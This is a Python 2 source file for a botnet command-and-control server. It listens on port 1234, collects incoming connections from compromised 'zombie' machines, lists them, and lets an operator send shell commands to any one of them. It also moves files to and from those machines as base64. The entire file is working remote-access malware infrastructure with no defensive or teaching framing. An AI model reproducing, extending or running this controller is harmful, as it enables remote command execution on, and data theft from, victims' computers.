import socket
import json, base64
import sys
from threading import Thread

class Server:
    def __init__(self, ip, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(0)
        self.connection = []
        self.address = []
        #self.stop = False   
        self.thr = Thread(target=self.zom_manager)
        self.thr.daemon = True
        self.thr.start()

    def zom_manager(self):
        while True:
            try:
                conn, add = self.server.accept()
                print("[+] Connection of: " + str(add))
                ips = []
                for i, (ip, port) in enumerate(self.address):
                    ips.append(ip)

                if add[0] in ips:
                    site = ips.index(add[0])
                    iplist = list(self.address[site])
                    iplist[1] = add[1]
                    self.address[site] = tuple(iplist)
                    self.connection[site] = conn
                else:
                    self.connection.append(conn)
                    self.address.append(add)
            except socket.timeout:
                continue
            except socket.error:
                continue
            except Exception:
                print("Error during accept connection.")

    def send_data(self, data, zom):
        json_data = json.dumps(data, ensure_ascii = False)
        self.connection[zom].send(json_data)

    def receive_data(self, zom):
        json_data = ""
        while True:
            try:
                json_data = self.connection[zom].recv(4096)
                return json.loads(json_data.decode("utf-8", "ignore"))
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def stoprun(self):
        sys.exit()

    def com_exe(self, command, zom):
        self.send_data(command, zom)
        return self.receive_data(zom)

    def zom_cmd(self, zom):
        while True:
            command = raw_input(">>")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    content = self.read_file(command[1])
                    command.append(content)
                elif command[0] == "exit":
                    self.run()

                result = self.com_exe(command, zom)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."

            print(result)

    def run(self):
        while True:
            select = raw_input("Server>> ")
            select = select.split(" ")
            
            if select[0] == "exit":
                self.stoprun()
            elif select[0] == "list":
                zom = ''
                for i, (ip, port) in enumerate(self.address):
                    try:
                        result = self.com_exe("whoami", i)
                    except Exception:
                        result = "[-] Error during command execution."
                    
                    if "[-] Error " not in result:
                        zom = zom + str(i) + "   " + str(ip) + ":" + str(port) + "      " + "Connected" + "\n"
                    else:
                        zom = zom + str(i) + "   " + str(ip) + ":" + str(port) + "      " + "Disconnected" + "\n"
                print("ZOM:" + "\n" + zom)
            elif select[0] == "use":
                self.zom_cmd(int(select[1]))

#try:
my_server = Server("192.168.0.8", 1234)
my_server.run()
#except Exception:
#    print("[-] Error during server execution.")
